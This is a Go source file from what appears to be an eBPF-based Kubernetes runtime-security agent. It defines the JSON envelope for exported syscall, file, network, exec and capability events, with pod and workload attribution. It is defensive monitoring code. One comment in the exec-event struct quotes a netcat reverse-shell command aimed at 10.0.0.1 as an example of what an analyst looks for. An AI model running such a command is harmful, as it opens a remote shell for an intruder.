// Package export turns the raw eBPF events produced by pkg/ebpf into a stable,
// versioned JSON envelope and ships it out of the process.
//
// The package is deliberately small and dependency free beyond the standard
// library, the Prometheus client and controller-runtime's metrics registry:
//
//	envelope   Event, the versioned JSON document every sink writes
//	sinks      StdoutExporter, FileExporter, WebhookExporter, Multi
//	buffering  Queue, a bounded non-blocking queue that drops rather than block
//	adapter    Handler, an ebpf.EventHandler that converts and enqueues
//
// The ring-buffer readers in pkg/ebpf must never block on an export sink, so
// every path from Handler through Queue is non-blocking. Events that cannot be
// queued are counted in pahlevan_export_dropped_total.
package export

import (
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"
)

// SchemaVersion is the version of the exported JSON envelope. Consumers should
// switch on it before interpreting the payload. It changes only when a field is
// removed or its meaning changes; additive fields keep the same version.
const SchemaVersion = "pahlevan.io/v1alpha1"

// DeniedFlag is the bit the LSM programs set in FileEvent.Flags and
// ProcessEvent.Flags to mark an access that was denied in-kernel.
const DeniedFlag uint32 = 0x80000000

// DeniedDirection is the bit network_monitor.c sets in NetworkEvent.Direction
// to mark a connect() that was denied in-kernel.
const DeniedDirection uint8 = 0x80

// EventType identifies which eBPF data source produced an event.
type EventType string

const (
	EventTypeSyscall    EventType = "syscall"
	EventTypeFile       EventType = "file"
	EventTypeNetwork    EventType = "network"
	EventTypeProcess    EventType = "process"
	EventTypeCapability EventType = "capability"
)

// AllEventTypes lists every event type the exporter understands.
func AllEventTypes() []EventType {
	return []EventType{EventTypeSyscall, EventTypeFile, EventTypeNetwork, EventTypeProcess, EventTypeCapability}
}

// EventTypeNames renders AllEventTypes as a comma separated list, for help
// text and error messages.
func EventTypeNames() string {
	names := make([]string, 0, len(AllEventTypes()))
	for _, t := range AllEventTypes() {
		names = append(names, string(t))
	}
	return strings.Join(names, ", ")
}

// ParseEventType validates a user supplied event type name.
func ParseEventType(s string) (EventType, error) {
	t := EventType(strings.ToLower(strings.TrimSpace(s)))
	for _, known := range AllEventTypes() {
		if t == known {
			return known, nil
		}
	}
	return "", fmt.Errorf("unknown event type %q (want one of %s)", s, EventTypeNames())
}

// Action says whether the kernel merely observed the operation or blocked it.
type Action string

const (
	// ActionObserve is a learning or monitoring observation.
	ActionObserve Action = "observe"
	// ActionDeny is an operation the LSM hooks refused in-kernel.
	ActionDeny Action = "deny"
)

// Event is the versioned envelope written by every sink. Exactly one of
// Syscall, File, Network or Process is populated, matching Type.
type Event struct {
	Version   string    `json:"version"`
	Timestamp Timestamp `json:"timestamp"`
	Type      EventType `json:"type"`
	Action    Action    `json:"action"`

	Process ProcessInfo `json:"process"`

	// CgroupID is the raw attribution key from bpf_get_current_cgroup_id().
	CgroupID uint64 `json:"cgroupId"`
	// KernelTimeNs is the raw bpf_ktime_get_ns() stamp (monotonic since boot).
	KernelTimeNs uint64 `json:"kernelTimeNs,omitempty"`

	Syscall    *SyscallInfo    `json:"syscall,omitempty"`
	File       *FileInfo       `json:"file,omitempty"`
	Network    *NetworkInfo    `json:"network,omitempty"`
	Exec       *ExecInfo       `json:"exec,omitempty"`
	Capability *CapabilityInfo `json:"capability,omitempty"`

	Kubernetes *KubernetesRef `json:"kubernetes,omitempty"`
}

// Denied reports whether the event records an in-kernel denial.
func (e *Event) Denied() bool { return e.Action == ActionDeny }

// Timestamp marshals as RFC3339Nano regardless of the platform default.
type Timestamp time.Time

func (t Timestamp) Time() time.Time { return time.Time(t) }

func (t Timestamp) MarshalJSON() ([]byte, error) {
	return json.Marshal(time.Time(t).UTC().Format(time.RFC3339Nano))
}

func (t *Timestamp) UnmarshalJSON(b []byte) error {
	var s string
	if err := json.Unmarshal(b, &s); err != nil {
		return err
	}
	parsed, err := time.Parse(time.RFC3339Nano, s)
	if err != nil {
		return err
	}
	*t = Timestamp(parsed)
	return nil
}

func (t Timestamp) String() string { return time.Time(t).UTC().Format(time.RFC3339Nano) }

// ProcessInfo carries the task identity common to every event.
type ProcessInfo struct {
	PID  uint32 `json:"pid"`
	TGID uint32 `json:"tgid,omitempty"`
	UID  uint32 `json:"uid"`
	GID  uint32 `json:"gid,omitempty"`
	Comm string `json:"comm"`

	// PPID and ParentComm name whoever caused this. A denied file open
	// attributed only to "cat" says what was refused and not who tried; with
	// the parent it says a shell did.
	PPID       uint32 `json:"ppid,omitempty"`
	ParentComm string `json:"parentComm,omitempty"`
}

// SyscallInfo describes an observed syscall.
type SyscallInfo struct {
	Number uint64 `json:"number"`
	Name   string `json:"name"`
}

// FileInfo describes a file access seen by the LSM file hooks.
type FileInfo struct {
	Path        string `json:"path"`
	Flags       uint32 `json:"flags"`
	Mode        uint16 `json:"mode,omitempty"`
	SyscallNr   uint32 `json:"syscallNumber,omitempty"`
	SyscallName string `json:"syscallName,omitempty"`
}

// NetworkInfo describes a connection attempt.
type NetworkInfo struct {
	SourceIP        string `json:"sourceIp,omitempty"`
	SourcePort      uint16 `json:"sourcePort,omitempty"`
	DestinationIP   string `json:"destinationIp"`
	DestinationPort uint16 `json:"destinationPort"`
	Protocol        string `json:"protocol"`
	ProtocolNumber  uint8  `json:"protocolNumber"`
	Direction       string `json:"direction"`

	// DestinationName is what the cluster says the address is:
	// "prod/postgres", "node-3", or empty when nothing knows it. An operator
	// reading "denied connect to 10.104.22.9:5432" has to go and look that up
	// before deciding whether it matters; "denied connect to prod/postgres"
	// they can act on.
	DestinationName string `json:"destinationName,omitempty"`
	// DestinationKind is service, pod, node, loopback or external. The
	// distinction that matters is the last one: a denied connect to an address
	// the cluster does not know is the shape exfiltration takes, and it is a
	// different finding from a denied connect to a Service this workload
	// simply may not use.
	DestinationKind string `json:"destinationKind,omitempty"`
	// DestinationPortName is the Service port's name, when it had one.
	DestinationPortName string `json:"destinationPortName,omitempty"`
}

// Address renders the destination as ip:port for human readable output.
func (n *NetworkInfo) Address() string {
	return net.JoinHostPort(n.DestinationIP, fmt.Sprintf("%d", n.DestinationPort))
}

// ExecInfo describes an execve seen by bprm_check_security.
type ExecInfo struct {
	Binary string `json:"binary"`

	// Ancestry is the process lineage, nearest ancestor first. A denied exec is
	// only actionable if you can see what spawned it, so the chain leaves the
	// process with the event rather than staying in the agent's logs.
	Ancestry []AncestorInfo `json:"ancestry,omitempty"`

	// AncestryChain renders the same lineage oldest-first for humans and for
	// log search, e.g. "nginx -> sh -> curl".
	AncestryChain string `json:"ancestryChain,omitempty"`

	// Args is argv as the caller passed it. It is what separates "nc ran" from
	// "nc -e /bin/sh 10.0.0.1 4444", and it is the field an analyst reads
	// first on a denied exec.
	Args []string `json:"args,omitempty"`

	// CommandLine is the same thing rendered for humans and log search.
	CommandLine string `json:"commandLine,omitempty"`

	// ArgsTruncated reports that the command line did not fit the kernel's
	// capture buffer, so Args is a prefix. Reading a truncated line as the
	// whole invocation is exactly the mistake this prevents.
	ArgsTruncated bool `json:"argsTruncated,omitempty"`

	// Cwd is the working directory the exec happened in. "nc run from /tmp"
	// and "nc run from the application's install directory" are different
	// findings.
	Cwd string `json:"cwd,omitempty"`

	// Exited marks the record as a process exit rather than an exec. An exit
	// carries no binary, argv or ancestry, so a consumer must check this
	// before reading them.
	Exited bool `json:"exited,omitempty"`
}

// AncestorInfo is one link in an exec's process lineage.
type AncestorInfo struct {
	PID  uint32 `json:"pid"`
	Comm string `json:"comm"`
}

// CapabilityInfo describes a capability check seen by the LSM capable hook.
type CapabilityInfo struct {
	Number uint32 `json:"number"`
	Name   string `json:"name"`

	// The task's capability sets at the time of the check, as names. The
	// checked capability says what the workload wanted; these say what it
	// could have done, which is what decides whether it is over-privileged.
	Effective   []string `json:"effective,omitempty"`
	Permitted   []string `json:"permitted,omitempty"`
	Inheritable []string `json:"inheritable,omitempty"`
}

// KubernetesRef is the optional pod attribution for an event. It is filled in
// by an AttributionFunc; fields the resolver cannot determine stay empty.
type KubernetesRef struct {
	Namespace   string `json:"namespace,omitempty"`
	Pod         string `json:"pod,omitempty"`
	Container   string `json:"container,omitempty"`
	PodUID      string `json:"podUid,omitempty"`
	ContainerID string `json:"containerId,omitempty"`
	Runtime     string `json:"runtime,omitempty"`
	QoSClass    string `json:"qosClass,omitempty"`

	// Node is where the event was observed. A denial is only actionable if you
	// can tell which kernel refused it.
	Node string `json:"node,omitempty"`

	// WorkloadKind and WorkloadName name the controller that owns the pod, for
	// example Deployment/nginx. A pod name is ephemeral; the workload is what
	// an operator actually reasons about and edits.
	WorkloadKind string `json:"workloadKind,omitempty"`
	WorkloadName string `json:"workloadName,omitempty"`

	// Labels are the pod's labels. They are what a policy selected the workload
	// by, so they are what makes a denial groupable by team or service in a log
	// pipeline rather than only by pod.
	Labels map[string]string `json:"labels,omitempty"`

	// Image is the container image. A denial in nginx:1.27 and one in a
	// hand-built image are very different findings, and it is usually the first
	// thing an analyst asks for.
	Image string `json:"image,omitempty"`
}

// Empty reports whether the reference carries no usable attribution.
func (k *KubernetesRef) Empty() bool {
	return k == nil || (k.Namespace == "" && k.Pod == "" && k.Container == "" &&
		k.PodUID == "" && k.ContainerID == "" && k.Runtime == "" && k.QoSClass == "")
}

// Complete reports whether the reference names a pod an operator can act on.
//
// A cgroup id resolves to a pod UID immediately, but turning that UID into a
// namespace and name needs the node's pod cache, which is populated by a
// refresh tick. Events arriving before that tick carry a UID and nothing else,
// which is why this is a distinct question from Empty: such a reference is
// worth emitting but must not be memoised, or a container attributed once at
// startup stays half-attributed for the agent's lifetime.
func (k *KubernetesRef) Complete() bool {
	return k != nil && k.Namespace != "" && k.Pod != ""
}

// AttributionFunc resolves a cgroup id to the pod that owns it. It is a plain
// function so callers can adapt whatever resolver they already have, for
// example pkg/attribution's Resolver:
//
//	r := attribution.NewResolver(attribution.DefaultCgroupRoot)
//	attrib := func(id uint64) (export.KubernetesRef, bool) {
//		ref, ok := r.Lookup(id)
//		if !ok {
//			return export.KubernetesRef{}, false
//		}
//		return export.KubernetesRef{
//			PodUID:      ref.PodUID,
//			ContainerID: ref.ContainerID,
//			Runtime:     ref.Runtime,
//			QoSClass:    ref.QoSClass,
//		}, true
//	}
type AttributionFunc func(cgroupID uint64) (KubernetesRef, bool)

// DestinationFunc names the far end of a connection: what the cluster says the
// address is, which kind of thing it is, and the Service port's name when it
// had one. All three may be empty, which is the honest answer for an address
// nothing knows.
//
// It takes the parsed address rather than the string so the implementation does
// not re-parse on every event, and it runs on the export path, so it must not
// make a network call - a burst of denials must not become a burst of DNS
// traffic at exactly the wrong moment.
type DestinationFunc func(ip net.IP, port uint16) (name, kind, portName string)

// SyscallName renders a syscall number using the generated table in
// pkg/seccomp, falling back to syscall_<nr> for numbers it does not know.
func SyscallName(nr uint64) string {
	if name, ok := lookupSyscallName(nr); ok {
		return name
	}
	return fmt.Sprintf("syscall_%d", nr)
}

func protocolName(proto uint8) string {
	switch proto {
	case 1:
		return "icmp"
	case 6:
		return "tcp"
	case 17:
		return "udp"
	case 58:
		return "icmpv6"
	case 132:
		return "sctp"
	default:
		return fmt.Sprintf("proto_%d", proto)
	}
}
